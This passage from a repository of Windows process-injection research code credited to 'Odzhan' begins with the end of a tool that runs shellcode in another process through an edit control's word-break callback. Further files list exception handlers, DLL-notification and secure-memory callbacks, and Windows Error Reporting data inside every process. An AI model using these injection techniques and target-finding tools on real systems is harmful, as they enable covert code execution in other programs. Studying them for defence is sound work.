    // execute shellcode
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)va);
    SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
    
    // set environment block to RW
    if(!VirtualProtectEx(pi.hProcess, env, 
      len, PAGE_READWRITE, &old)) {
      xstrerror(L"VirtualProtectEx(RW)");
    }
cleanup:
    // cleanup and exit
    SetEnvironmentVariable(name, NULL);
    
    if(pi.hProcess != NULL) {
      //TerminateProcess(pi.hProcess, 0);
      CloseHandle(pi.hThread);
      CloseHandle(pi.hProcess);
    }
}

int main(void) {
    WCHAR **argv;
    int   argc;
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if(argc != 2) {
      printf("usage: var_inject <command>\n");
      return 0;
    }
    
    var_inject(argv[1]);
    
    return 0;
}

```

`cmdline/veh.c`:

```c
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#include "../ntlib/util.h"

typedef HRESULT(WINAPI *_RtlDecodeRemotePointer)(
  HANDLE    ProcessHandle,
  PVOID     Ptr,
  PVOID     *DecodedPtr);
  
// vectored handler list
typedef struct _RTL_VECTORED_HANDLER_LIST {
    PSRWLOCK                    Lock;
    LIST_ENTRY                  List;
} RTL_VECTORED_HANDLER_LIST, *PRTL_VECTORED_HANDLER_LIST;

// exception handler entry
typedef struct _RTL_VECTORED_EXCEPTION_ENTRY {
    LIST_ENTRY                  List;
    PULONG_PTR                  Flag;           // some flag related to CFG
    ULONG                       RefCount;
    PVECTORED_EXCEPTION_HANDLER VectoredHandler;
} RTL_VECTORED_EXCEPTION_ENTRY, *PRTL_VECTORED_EXCEPTION_ENTRY;

// fake handler
LONG WINAPI VectoredHandler(struct _EXCEPTION_POINTERS *ExceptionInfo) {
    UNREFERENCED_PARAMETER(ExceptionInfo);
    
    return EXCEPTION_CONTINUE_SEARCH;
}

// search the .mrdata section for fake handler
PVOID GetVectoredHandlerList(VOID) {
    PIMAGE_DOS_HEADER      dos;
    PIMAGE_NT_HEADERS      nt;
    PIMAGE_SECTION_HEADER  sh;
    HMODULE                m;
    PVOID                  h;
    BOOL                   found = FALSE;
    DWORD                  i, cnt;
    PULONG_PTR             ds;
    
    // install our own handler.
    h = AddVectoredExceptionHandler(1, VectoredHandler);
    
    // now try find in list
    m   = GetModuleHandle(L"ntdll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
    
    // locate the .mrdata segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".mrdata") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }

    // Find handler in section
    for(i=0; i<cnt - 1 && !(found = ((PVOID)ds[i] == h)); i++);
    
    // remove handler from list
    RemoveVectoredExceptionHandler(h);
    
    // if found, return the pointer to list
    return found ? &ds[i - 1] : NULL;    
}

typedef struct _RTL_SECURE_MEM {
    LIST_ENTRY                    List;
    ULONG                         Revision;
    ULONG                         Reserved;
    PSECURE_MEMORY_CACHE_CALLBACK Callback;
} RTL_SECURE_MEM, *PRTL_SECURE_MEM;

BOOLEAN PsecureMemoryCacheCallback(
  PVOID Addr,
  SIZE_T Range
)
{
    return FALSE;
}

// search the .data section for fake callback
PVOID GetSecMemList(VOID) {
    PIMAGE_DOS_HEADER      dos;
    PIMAGE_NT_HEADERS      nt;
    PIMAGE_SECTION_HEADER  sh;
    HMODULE                m;
    BOOL                   found = FALSE;
    DWORD                  i, cnt;
    PULONG_PTR             ds;
    PRTL_SECURE_MEM        sm;
    
    // install our callback
    AddSecureMemoryCacheCallback(PsecureMemoryCacheCallback);
    
    // now try find in list
    m   = GetModuleHandle(L"ntdll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
    
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }

    // Find handler in section
    for(i=0; i<cnt - 1; i++) {
      // not heap? skip it...
      if(!IsHeapPtr((PVOID)ds[i])) continue;
      // not our callback? skip it..
      sm = (PRTL_SECURE_MEM)ds[i];
      if(sm->Callback != PsecureMemoryCacheCallback) continue;
      found = TRUE;
      break;
    }
    
    // remove from list
    RemoveSecureMemoryCacheCallback(PsecureMemoryCacheCallback);
    
    // if found, return the pointer to list
    return found ? &ds[i] : NULL;    
}

void veh_dump(HANDLE hp, PWCHAR proc, PVOID vhl_va, int idx) {
    RTL_VECTORED_EXCEPTION_ENTRY ee;
    RTL_VECTORED_HANDLER_LIST    vhl[2];
    SIZE_T                       rd;
    PVOID                        ptr;
    _RtlDecodeRemotePointer      RtlDecodeRemotePointer;
    
    RtlDecodeRemotePointer = (_RtlDecodeRemotePointer)
      GetProcAddress(GetModuleHandle(L"ntdll"), "RtlDecodeRemotePointer");
      
    // read list
    ReadProcessMemory(
      hp, vhl_va, &vhl, sizeof(vhl), &rd);
    
    ptr = vhl[idx].List.Flink;
    
    for(;;) {
      // read entry
      ReadProcessMemory(
        hp, ptr, &ee, sizeof(ee), &rd);
      
      if(ee.List.Flink == vhl[idx].List.Flink) break;
      
      RtlDecodeRemotePointer(hp, ee.VectoredHandler, &ptr);
      wprintf(L"VEH | %-25s : %p\n", proc, ptr);

      ptr = ee.List.Flink;
    }
}

void seh_dump(HANDLE hp, DWORD pid, PWCHAR proc) {
    HANDLE                   ss, ht;
    THREADENTRY32            te;
    NTSTATUS                 nts;
    PVOID                    el;
    SIZE_T                   rd;
    THREAD_BASIC_INFORMATION tbi;
    ULONG                    len;
    
    // 1. Enumerate threads in target process
    ss = CreateToolhelp32Snapshot(
      TH32CS_SNAPTHREAD, 0);
      
    if(ss == INVALID_HANDLE_VALUE) return;

    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(te.th32OwnerProcessID != pid) continue;
        
        // if we can't open thread, skip it
        ht = OpenThread(
          THREAD_ALL_ACCESS, 
          FALSE, 
          te.th32ThreadID);
          
        if(ht == NULL) continue;
        
        nts = NtQueryInformationThread(
          ht, ThreadBasicInformation,
          &tbi, sizeof(tbi), &len);
        
        if(nts == 0) {
          ReadProcessMemory(hp, 
            tbi.TebBaseAddress, &el, 
            sizeof(ULONG_PTR), &rd);
          
          if(el != NULL) 
            wprintf(L"SEH | %-25s : %p\n", proc, el);
        }
        CloseHandle(ht);
      } while(Thread32Next(ss, &te));
    }
    CloseHandle(ss);
}

void sm_dump(HANDLE hp, PWCHAR proc, DWORD pid, PVOID sm_va) {
    LIST_ENTRY      le;
    RTL_SECURE_MEM  sm;
    SIZE_T          rd;
    PVOID           ptr;
    
    // read list
    ReadProcessMemory(
      hp, sm_va, &le, sizeof(le), &rd);
    
    ptr = le.Flink;
    
    for(;;) {
      // read entry
      ReadProcessMemory(
        hp, ptr, &sm, sizeof(sm), &rd);
      
      if(sm.List.Flink == le.Flink) break;

      wprintf(L"SM | %-25s [%i] : %p\n", proc, pid, sm.Callback);

      ptr = sm.List.Flink;
    }
}
    
// sechost!I_RegisterSvchostNotificationCallback
// sechost!EtwpEventCallbackList for SetTraceCallback

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG Flags;                    //Reserved.
    PUNICODE_STRING FullDllName;   //The full path name of the DLL module.
    PUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
    PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
    ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_LOADED_NOTIFICATION_DATA, *PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA {
    ULONG Flags;                    //Reserved.
    PUNICODE_STRING FullDllName;   //The full path name of the DLL module.
    PUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
    PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
    ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, *PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

typedef NTSTATUS (*PLDR_DLL_NOTIFICATION_FUNCTION) (
    _In_     ULONG                      NotificationReason,
    _In_     PLDR_DLL_NOTIFICATION_DATA NotificationData,
    _In_opt_ PVOID                      Context);
    
typedef NTSTATUS(NTAPI * _LdrRegisterDllNotification) (
    _In_     ULONG                          Flags,
    _In_     PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    _In_opt_ PVOID                          Context,
    _Out_    PVOID                          *Cookie
    );
    
typedef NTSTATUS(NTAPI *_LdrUnregisterDllNotification)(
  _In_ PVOID Cookie
);

VOID CALLBACK LdrDllNotification(
    _In_     ULONG                       NotificationReason,
    _In_     PLDR_DLL_NOTIFICATION_DATA  NotificationData,
    _In_opt_ PVOID                       Context
)
{
    //
}

typedef struct _DLL_NOTIFICATION_CALLBACK {
    LIST_ENTRY                 List;
    PLDR_DLL_NOTIFICATION_DATA Callback;
    PVOID                      Context;
} DLL_NOTIFICATION_CALLBACK, *PDLL_NOTIFICATION_CALLBACK;

void dnc_dump(HANDLE hp, PWCHAR proc, DWORD pid, PVOID dnc_va) {
    LIST_ENTRY                le;
    DLL_NOTIFICATION_CALLBACK dnc;
    SIZE_T                    rd;
    PVOID                     ptr;
    
    // read list
    ReadProcessMemory(
      hp, dnc_va, &le, sizeof(le), &rd);
    
    ptr = le.Flink;
    
    for(;;) {
      // read entry
      ReadProcessMemory(
        hp, ptr, &dnc, sizeof(dnc), &rd);
      
      if(dnc.List.Flink == le.Flink) break;

      wprintf(L"DllNotification | %-25s [%i] : %p\n", proc, pid, dnc.Callback);

      ptr = dnc.List.Flink;
    }
}

// find LdrpDllNotificationList
PVOID GetDllNotificationList(VOID) {
    PIMAGE_DOS_HEADER          dos;
    PIMAGE_NT_HEADERS          nt;
    PIMAGE_SECTION_HEADER      sh;
    HMODULE                    m;
    BOOL                       found = FALSE;
    DWORD                      i, cnt;
    PULONG_PTR                 ds;
    PDLL_NOTIFICATION_CALLBACK dnc;
    PVOID                      Cookie;
    
    _LdrRegisterDllNotification LdrRegisterDllNotification = 
        (_LdrRegisterDllNotification)GetProcAddress(GetModuleHandle(L"ntdll"), "LdrRegisterDllNotification");

    _LdrUnregisterDllNotification LdrUnregisterDllNotification = 
        (_LdrUnregisterDllNotification)GetProcAddress(GetModuleHandle(L"ntdll"), "LdrUnregisterDllNotification");
        
    // install our callback
    LdrRegisterDllNotification(0, LdrDllNotification, NULL, &Cookie);
    
    // now try find in list
    m   = GetModuleHandle(L"ntdll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
    
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }

    // Find handler in section
    for(i=0; i<cnt - 1; i++) {
      // not heap? skip it...
      if(!IsHeapPtr((PVOID)ds[i])) continue;
      // not our callback? skip it..
      dnc = (PDLL_NOTIFICATION_CALLBACK)ds[i];
      if(dnc->Callback != LdrDllNotification) continue;
      found = TRUE;
      break;
    }
    
    // remove from list
    LdrUnregisterDllNotification(Cookie);
    
    // if found, return the pointer to list
    return found ? &ds[i] : NULL;   
}
    
void scan_system(DWORD pid) {
    PVOID          dnc, va, sm;
    HANDLE         ss;
    PROCESSENTRY32 pe;
    HANDLE         hp;
    
    va = GetVectoredHandlerList();
    sm = GetSecMemList();
    dnc = GetDllNotificationList();
    
    printf("DNC : %p\n", dnc);
    printf("SM  : %p\n", sm);
    
    if(va == NULL) {
      wprintf(L"  [ ERROR: Unable to resolve address of LdrpVectorHandlerList.\n");
      return;
    }
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(ss, &pe)){
      do {
        // skip system
        if(pe.th32ProcessID <= 4) continue;
        
        // if filtering by process id, skip entries that don't match
        if(pid != 0 && pe.th32ProcessID != pid) continue;
        
        // try open process
        hp = OpenProcess(
          PROCESS_ALL_ACCESS, 
          FALSE, 
          pe.th32ProcessID);
          
        if(hp != NULL) {
          seh_dump(hp, pe.th32ProcessID, pe.szExeFile);
          
          veh_dump(hp, pe.szExeFile, va, 0);
          veh_dump(hp, pe.szExeFile, va, 1);
          
          sm_dump(hp, pe.szExeFile, pe.th32ProcessID, sm);
          dnc_dump(hp, pe.szExeFile, pe.th32ProcessID, dnc);
          
          CloseHandle(hp);
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

int main(void) {
    WCHAR **argv, *process=NULL;
    int   argc, pid=0;
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if(argc == 2) {
      pid = name2pid(argv[1]);
      if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
      if(pid == 0) {
        wprintf(L"  [ ERROR: Unable to resolve pid for \"%s\".\n", argv[1]);
        return -1;
      }
    }
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      wprintf(L"  [ WARNING: Failed to enable debugging privilege.\n");
    }
    
    scan_system(pid);
    
    return 0;
}

```

`cmdline/wer.h`:

```h
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#ifndef WER_H
#define WER_H

// WerRegisterCustomMetadata
typedef struct _WER_METADATA {
    PVOID                Next;
    WCHAR                Key[64];
    WCHAR                Value[128];
} WER_METADATA, *PWER_METADATA;

// WerRegisterFile
// Registers a file to be collected when WER creates an error report.
typedef struct _WER_FILE {
    USHORT               Flags;
    WCHAR                Path[MAX_PATH];
} WER_FILE, *PWER_FILE;

// WerRegisterExcludedMemoryBlock
// Marks a memory block (that is normally included by default in error reports) to be excluded from the error report.
//
// WerRegisterMemoryBlock
// Registers a memory block to be collected when WER creates an error report.
typedef struct _WER_MEMORY {
    PVOID                Address;   // The starting address of the memory block.
    ULONG                Size;      // The size of the memory block, in bytes.
} WER_MEMORY, *PWER_MEMORY;

typedef struct _WER_GATHER {
    PVOID                Next;
    USHORT               Flags;    
    union {
      WER_FILE           File;
      WER_MEMORY         Memory;
    } v;
} WER_GATHER, *PWER_GATHER;

// WerRegisterAdditionalProcess
typedef struct _WER_DUMP_COLLECTION {
    PVOID                Next;
    DWORD                ProcessId;              // The Id of the process to register.
    DWORD                ThreadId;   // The Id of a thread within the registered process from which more information is requested.
} WER_DUMP_COLLECTION, *PWER_DUMP_COLLECTION;

typedef struct _WER_RUNTIME_DLL {
    PVOID                Next;
    ULONG                Length;                 // total length of this structure
    PVOID                Context;                // passed to callback in DLL
    WCHAR                CallbackDllPath[MAX_PATH];
} WER_RUNTIME_DLL, *PWER_RUNTIME_DLL;

// GetApplicationRecoveryCallback to read from remote process
// RegisterApplicationRecoveryCallback
typedef struct _WER_RECOVERY_INFO {
    ULONG                Length;
    PVOID                Callback;
    PVOID                Parameter;
    HANDLE               Started;
    HANDLE               Finished;            // read by ApplicationRecoveryFinished
    HANDLE               InProgress;          // read by ApplicationRecoveryInProgress
    LONG                 LastError;
    BOOL                 Successful;
    DWORD                PingInterval;
    DWORD                Flags;
} WER_RECOVERY_INFO, *PWER_RECOVERY_INFO;

typedef struct _WER_HEAP_MAIN_HEADER {
    WCHAR                Signature[16];                // HEAP_SIGNATURE 
    LIST_ENTRY           ListHead;
    HANDLE               Mutex;
    PVOID                FreeHeap;
    PVOID                FreeCount;
} WER_HEAP_MAIN_HEADER, *PWER_HEAP_MAIN_HEADER;

typedef struct _WER_PEB_HEADER_BLOCK {
    LONG                 Length;
    WCHAR                Signature[16];
    WCHAR                AppDataRelativePath[64];
    WCHAR                RestartCommandLine[RESTART_MAX_CMD_LINE];
    WER_RECOVERY_INFO    RecoveryInfo;
    PWER_GATHER          Gather;
    PWER_METADATA        MetaData;
    PWER_RUNTIME_DLL     RuntimeDll;
    PWER_DUMP_COLLECTION DumpCollection;
    LONG                 GatherCount;
    LONG                 MetaDataCount;
    LONG                 DumpCount;
    LONG                 Flags;
    WER_HEAP_MAIN_HEADER MainHeader;
    PVOID                Reserved;
} WER_PEB_HEADER_BLOCK, *PWER_PEB_HEADER_BLOCK;

#endif

```

`cmdline/werinfo.c`:

```c
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#include "../ntlib/util.h"

#include "wer.h"

PWCHAR get_mapped_file(HANDLE hp, PVOID address) {
    static WCHAR path[MAX_PATH];
    ZeroMemory(path, sizeof(path));
    
    GetMappedFileName(hp, address, path, MAX_PATH);
    return path;
}
          
/**
RtlDecodeSystemPointer proc near
.text:00007FFEE09B0DC0                 mov     r8d, ds:7FFE0330h
.text:00007FFEE09B0DC8                 mov     r9, rcx
.text:00007FFEE09B0DCB                 mov     edx, r8d
.text:00007FFEE09B0DCE                 mov     eax, r8d
.text:00007FFEE09B0DD1                 and     edx, 63
.text:00007FFEE09B0DD4                 mov     ecx, 64
.text:00007FFEE09B0DD9                 sub     ecx, edx
.text:00007FFEE09B0DDB                 ror     r9, cl
.text:00007FFEE09B0DDE                 xor     rax, r9
.text:00007FFEE09B0DE1                 retn
.text:00007FFEE09B0DE1 RtlDecodeSystemPointer endp
*/
void recovery_info(HANDLE hp, PWER_RECOVERY_INFO ri) {
    if(ri->Length == 0) return;
    
    printf("Recovery Info    : %p\n", ri);
    
    printf("Length           : %i\n", ri->Length);
    printf("Callback         : %p\n", (PVOID)DecodeSystemPointer(ri->Callback));
    printf("Parameter        : %p\n", ri->Parameter); 
    printf("StartedEvent     : %p\n", ri->Started); 
    printf("FinishedEvent    : %p\n", ri->Finished); 
    printf("InProgressEvent  : %p\n", ri->InProgress); 
    printf("LastError        : %08lx\n", ri->LastError); 
    printf("Successful       : %i\n", ri->Successful); 
    printf("PingInterval     : %08lx\n", ri->PingInterval); 
    printf("Flags            : %08lx\n", ri->Flags); 
}

void gather_info(HANDLE hp, PVOID List, DWORD Count) {
    WER_GATHER wg;
    PVOID      ptr;
    SIZE_T     rd;
    
    if(List == NULL || Count == 0) return;
    ptr = List;
    
    printf("Gather : %p\n", List);
    
    for(;;) {
      ReadProcessMemory(
        hp, ptr, &wg, 
        sizeof(wg), &rd);
      
      if(rd != sizeof(wg)) break;
      
      if((wg.Flags & 0xC000) == 0x4000) {
        printf("File       : %ws\n", wg.v.File.Path);
      } else {
        if(wg.Flags & 0x8000) {
          printf("** HIDDEN **\n");
        }
        ptr = (PVOID)wg.v.Memory.Address;
        printf("Size       : %i\n", wg.v.Memory.Size); 
        printf("Address    : %p %ws\n", ptr, get_mapped_file(hp, ptr));
      }
      printf("******************************\n");
      if(wg.Next == 0) break;
      ptr = (PVOID)wg.Next;
    }
    putchar('\n');
}

void metadata_info(HANDLE hp, PVOID List, DWORD Count) {
    WER_METADATA md;
    PVOID        ptr;
    SIZE_T       rd;
    
    if(List == NULL || Count == 0) return;
    ptr = List;
    
    printf("MetaData : %p\n", List);
    
    for(;;) {
      ReadProcessMemory(
        hp, ptr, &md, 
        sizeof(md), &rd);
      
      if(rd != sizeof(md)) break;
      
      printf("Key   : %ws\n", md.Key);
      printf("Value : %ws\n", md.Value);
    
      if(md.Next == 0) break;
      ptr = (PVOID)md.Next;
    }
    putchar('\n');
}

void runtime_info(HANDLE hp, PVOID List) {
    WER_RUNTIME_DLL rt;
    PVOID           ptr;
    SIZE_T          rd;
    
    if(List == NULL) return;
    ptr = List;
    
    printf("Runtime : %p\n", List);
    
    for(;;) {
      ReadProcessMemory(
        hp, ptr, &rt, 
        sizeof(rt), &rd);
      
      if(rd != sizeof(rt)) break;
      
      printf("Context      : %p\n",  (PVOID)rt.Context);
      printf("Callback DLL : %ws\n", (PWCHAR)rt.CallbackDllPath);
    
      if(rt.Next == 0) break;
      ptr = (PVOID)rt.Next;
    }
    putchar('\n');
}

void dump_info(HANDLE hp, PVOID List, DWORD Count) {
    WER_DUMP_COLLECTION dc;
    PVOID               ptr;
    SIZE_T              rd;
    
    if(List == NULL || Count == 0) return;
    ptr = List;
    
    printf("DumpCollection : %p | Count : %i\n", List, Count);
    
    for(;;) {
      ReadProcessMemory(
        hp, ptr, &dc, 
        sizeof(dc), &rd);
      
      printf("Process ID : %08lx\n", dc.ProcessId);
      printf("Thread ID  : %08lx\n", dc.ThreadId);
    
      if(dc.Next == 0) break;
      ptr = (PVOID)dc.Next;
    }
    putchar('\n');
}

void main_info(HANDLE hp, PWER_HEAP_MAIN_HEADER hdr) {
    if(hdr == NULL) return;
    
    printf("Main Header  : %p\n", (PVOID)hdr);
    
    printf("FreeHeap  : %p\n", hdr->FreeHeap);
    printf("FreeCount : %p\n", hdr->FreeCount);
}

void wer_dump(HANDLE hp, DWORD pid, PWCHAR proc) {
    NTSTATUS                  nts;
    PROCESS_BASIC_INFORMATION pbi;
    ULONG                     len;
    PEB                       peb;
    SIZE_T                    rd;
    WER_PEB_HEADER_BLOCK      wer;
    
    nts = NtQueryInformationProcess(
      hp, ProcessBasicInformation,
      &pbi, sizeof(pbi), &len);
    
    ReadProcessMemory(
      hp, pbi.PebBaseAddress,
      &peb, sizeof(PEB), &rd);
     
    if(peb.WerRegistrationData != NULL) {
      wprintf(L"\nWerRegistrationData : %p [%04i] %s\n", 
        peb.WerRegistrationData, pid, proc);
        
      ReadProcessMemory(
        hp, peb.WerRegistrationData,
        &wer, sizeof(wer), &rd);
        
      if(wer.AppDataRelativePath[0] != 0)
        printf("localAppDataRelativePath : %ws\n", wer.AppDataRelativePath);
      
      if(wer.RestartCommandLine[0] != 0) 
        printf("RestartCommandLine  : %ws\n", wer.RestartCommandLine);

      gather_info(hp, (PVOID)wer.Gather, wer.GatherCount);
      metadata_info(hp, (PVOID)wer.MetaData, wer.MetaDataCount);
      runtime_info(hp, (PVOID)wer.RuntimeDll);
      dump_info(hp, (PVOID)wer.DumpCollection, wer.DumpCount);
      recovery_info(hp, &wer.RecoveryInfo);
      main_info(hp, &wer.MainHeader);
    }
}

void scan_system(DWORD pid) {
    HANDLE         ss;
    PROCESSENTRY32 pe;
    HANDLE         hp;
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(ss, &pe)){
      do {
        // skip system
        if(pe.th32ProcessID <= 4) continue;
        
        // if filtering by process id, skip entries that don't match
        if(pid != 0 && pe.th32ProcessID != pid) continue;
        
        // try open process
        hp = OpenProcess(
          PROCESS_ALL_ACCESS, 
          FALSE, 
          pe.th32ProcessID);
          
        if(hp != NULL) {
          wer_dump(hp, pe.th32ProcessID, pe.szExeFile);
          
          CloseHandle(hp);
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

int main(void) {
    WCHAR **argv, *process=NULL;
    int   argc, pid=0;
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if(argc == 2) {
      pid = name2pid(argv[1]);
      if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
      if(pid == 0) {
        wprintf(L"  [ ERROR: Unable to resolve pid for \"%s\".\n", argv[1]);
        return -1;
      }
    }
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      wprintf(L"  [ WARNING: Failed to enable debugging privilege.\n");
    }
    
    scan_system(pid);
    printf("Finished.\n");
    return 0;
}
```

`cmdline/win_inject.c`:

```c
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
